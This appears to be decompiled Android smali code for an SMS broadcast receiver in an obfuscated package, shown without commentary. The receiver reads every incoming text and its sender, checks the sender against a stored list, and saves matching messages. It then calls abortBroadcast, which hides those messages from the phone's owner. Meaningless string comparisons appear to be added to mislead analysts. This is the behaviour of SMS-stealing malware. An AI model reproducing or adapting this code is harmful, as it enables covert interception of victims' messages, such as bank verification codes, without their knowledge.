.class public Lcom/tujtr/rtbrr/SReceiver;
.super Landroid/content/BroadcastReceiver;


# static fields
.field static a:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/tujtr/rtbrr/SReceiver;->a:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Landroid/content/Intent;)Landroid/os/Bundle;
    .locals 4

    const/4 v1, 0x0

    const-string v0, "rgwkep"

    const-string v2, "true"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    const-string v0, "g3oeg"

    :cond_0
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    if-nez v2, :cond_2

    const-string v2, ""

    const-string v3, ""

    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "239502"

    :cond_1
    move-object v0, v1

    :goto_0
    return-object v0

    :cond_2
    const-string v0, "erw"

    invoke-virtual {v0}, Ljava/lang/Object;->hashCode()I

    move-object v0, v2

    goto :goto_0
.end method

.method public a(Landroid/content/Context;)Lcom/tujtr/rtbrr/e;
    .locals 1

    new-instance v0, Lcom/tujtr/rtbrr/e;

    invoke-direct {v0, p1}, Lcom/tujtr/rtbrr/e;-><init>(Landroid/content/Context;)V

    return-object v0
.end method

.method public a(Landroid/telephony/SmsMessage;)Ljava/lang/String;
    .locals 2

    invoke-virtual {p1}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    return-object v0
.end method

.method public a(Ljava/lang/String;Landroid/telephony/SmsMessage;Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    invoke-virtual {p0, p2}, Lcom/tujtr/rtbrr/SReceiver;->a(Landroid/telephony/SmsMessage;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {p3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, p2}, Lcom/tujtr/rtbrr/SReceiver;->a(Landroid/telephony/SmsMessage;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    :cond_0
    return-object p3
.end method

.method public a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    invoke-virtual {p0, p1}, Lcom/tujtr/rtbrr/SReceiver;->a(Landroid/content/Context;)Lcom/tujtr/rtbrr/e;

    move-result-object v2

    invoke-virtual {v2}, Lcom/tujtr/rtbrr/e;->b()Lorg/json/JSONArray;

    move-result-object v3

    if-eqz v3, :cond_0

    const/4 v0, 0x0

    :goto_0
    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    move-result v1

    if-lt v0, v1, :cond_1

    :cond_0
    return-void

    :cond_1
    :try_start_0
    invoke-virtual {v3, v0}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-virtual {v2, p2, p3}, Lcom/tujtr/rtbrr/e;->b(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/tujtr/rtbrr/SReceiver;->abortBroadcast()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    :cond_2
    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_1
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7

    const/4 v1, 0x0

    :try_start_0
    invoke-virtual {p0, p2}, Lcom/tujtr/rtbrr/SReceiver;->a(Landroid/content/Intent;)Landroid/os/Bundle;

    move-result-object v0

    const-string v3, ""

    const-string v2, ""

    if-eqz v0, :cond_0

    const-string v4, "pdus"

    invoke-virtual {v0, v4}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    move v6, v1

    move-object v1, v3

    move-object v3, v2

    move v2, v6

    :goto_0
    array-length v4, v0

    if-lt v2, v4, :cond_1

    invoke-virtual {p0, p1, v1, v3}, Lcom/tujtr/rtbrr/SReceiver;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-boolean v0, Lcom/tujtr/rtbrr/TheSure;->d:Z

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Lcom/tujtr/rtbrr/SReceiver;->abortBroadcast()V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/tujtr/rtbrr/TheSure;->d:Z

    :cond_0
    :goto_1
    return-void

    :cond_1
    aget-object v1, v0, v2

    check-cast v1, [B

    invoke-static {v1}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v1

    invoke-virtual {p0, v1}, Lcom/tujtr/rtbrr/SReceiver;->a(Landroid/telephony/SmsMessage;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v5, v1, v3}, Lcom/tujtr/rtbrr/SReceiver;->a(Ljava/lang/String;Landroid/telephony/SmsMessage;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v3

    add-int/lit8 v1, v2, 0x1

    move v2, v1

    move-object v1, v4

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_1
.end method
